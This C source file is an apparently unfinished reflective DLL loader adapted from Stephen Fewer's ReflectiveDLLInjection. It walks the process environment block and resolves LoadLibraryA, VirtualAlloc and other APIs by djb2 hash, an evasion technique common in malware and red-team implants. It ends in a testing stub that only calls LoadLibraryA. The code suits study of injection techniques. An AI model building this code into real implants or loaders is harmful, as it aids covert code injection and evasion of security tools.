// Reference: https://github.com/stephenfewer/ReflectiveDLLInjection
// Taken and adapted from:
//      https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c
// Additional references:
//      https://void-stack.github.io/blog/post-Exploring-PEB/
//      https://www.nirsoft.net/kernel_struct/vista/PEB.html
//      https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html
//      https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm
//      https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/

#include "loader.h"

DWORD ReflectiveLoader( LPVOID lpParameter ) {
    // Function pointers
    LOADLIBRARYA pLoadLibraryA     = NULL;
    GETPROCADDRESS pGetProcAddress = NULL;
    VIRTUALALLOC pVirtualAlloc     = NULL;
    NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

    // Initial location of DLL to inject in memoory
    ULONG_PTR uiLibraryAddress = (ULONG_PTR)lpParameter;

    // process environment block pointers
    ULONG_PTR pebAddress;
    PPEB_LDR_DATA pPebLdrData;

    // variables for processing module export tables
    PIMAGE_NT_HEADERS moduleNtHeader;
    ULONG_PTR moduleBaseAddress;
    PIMAGE_EXPORT_DIRECTORY moduleExportDir;
    PDWORD moduleFuncExportTable;
    PDWORD moduleFuncNameTable;
    PWORD moduleFuncOrdinalTable;
    DWORD apiHashValue;
    USHORT remainingExports;
    char* funcName;
    UINT32 namesProcessed;
    ULONG_PTR funcAddr;

    // variables for loading the target image
    ULONG_PTR uiHeaderValue;
    PLDR_DATA_TABLE_ENTRY pebModuleEntry;
    PWSTR pebModuleName;
    DWORD pebModuleNameHash;
    ULONG_PTR uiValueD;
    ULONG_PTR uiValueE;


    // ===========================================================//
    // Process the kernel's exports for required loader functions //
    // ===========================================================//

    // Access the PEB (x64 only)
    pebAddress = __readgsqword(0x60);

    // Get the loaded modules for the host process
    // References: https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
    // https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data
    pPebLdrData = (PPEB_LDR_DATA)((_PPEB)pebAddress)->pLdr;

    // Iterate through and process module entries in the PEB
    pebModuleEntry = (PLDR_DATA_TABLE_ENTRY)pPebLdrData->InMemoryOrderModuleList.Flink;
    while (pebModuleEntry) {
        // get pointer to current module name (unicode string)
        pebModuleName = ((PLDR_DATA_TABLE_ENTRY)pebModuleEntry)->BaseDllName.Buffer;

        // Perform hash comparisons to check if we need to process this module
        // We want kernel32.dll and ntdll.dll
        pebModuleNameHash = djb2_hash_case_insensitive_wide(pebModuleName, pebModuleEntry->BaseDllName.Length);
        if (pebModuleNameHash == KERNEL32DLL_HASH || pebModuleNameHash == NTDLLDLL_HASH) {
            // Process module of interest - get the exported functions
            moduleBaseAddress = (ULONG_PTR)(pebModuleEntry->DllBase);
            moduleNtHeader = (PIMAGE_NT_HEADERS)(moduleBaseAddress + ((PIMAGE_DOS_HEADER)moduleBaseAddress)->e_lfanew);

            // Get export directory and related export info
            moduleExportDir = (PIMAGE_EXPORT_DIRECTORY)(moduleBaseAddress + moduleNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
            moduleFuncExportTable = (PDWORD)(moduleBaseAddress + moduleExportDir->AddressOfFunctions);
            moduleFuncNameTable = (PDWORD)(moduleBaseAddress + moduleExportDir->AddressOfNames);
            moduleFuncOrdinalTable = (PWORD)(moduleBaseAddress + moduleExportDir->AddressOfNameOrdinals);

            // Grabbing a total of 3 APIs from Kernel32.dll, 1 from Ntdll.dll
            if (pebModuleNameHash == KERNEL32DLL_HASH) {
                remainingExports = 3;
            } else {
                remainingExports = 1;
            }

            // Process the exported names and grab the address of the ones that match desired hashes
            namesProcessed = 0;
            while (remainingExports > 0 && namesProcessed < moduleExportDir->NumberOfNames) {
                funcName = (char *)(moduleBaseAddress + moduleFuncNameTable[namesProcessed]);
                apiHashValue = djb2_hash(funcName);
                if (apiHashValue == LOADLIBRARYA_HASH || apiHashValue == GETPROCADDRESS_HASH || apiHashValue == VIRTUALALLOC_HASH || apiHashValue == NTFLUSHINSTRUCTIONCACHE_HASH) {
                    funcAddr = (ULONG_PTR)(moduleBaseAddress + moduleFuncExportTable[moduleFuncOrdinalTable[namesProcessed]]);
                    if (apiHashValue == LOADLIBRARYA_HASH)
                        pLoadLibraryA = (LOADLIBRARYA)funcAddr;
                    else if (apiHashValue == GETPROCADDRESS_HASH)
                        pGetProcAddress = (GETPROCADDRESS)funcAddr;
                    else if (apiHashValue == VIRTUALALLOC_HASH)
                        pVirtualAlloc = (VIRTUALALLOC)funcAddr;
                    else if (apiHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
                        pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)funcAddr;

                    remainingExports--;
                }
                namesProcessed++;
            }
        }

        // No need to continue processing modules once we have our APIs
        if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache)
            break;

        // Iterate to next module
        pebModuleEntry = (PLDR_DATA_TABLE_ENTRY)pebModuleEntry->InMemoryOrderModuleList.Flink;
    }

    // testing
    if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache) {
        pLoadLibraryA((char*)lpParameter);
    }

    return 0;
}
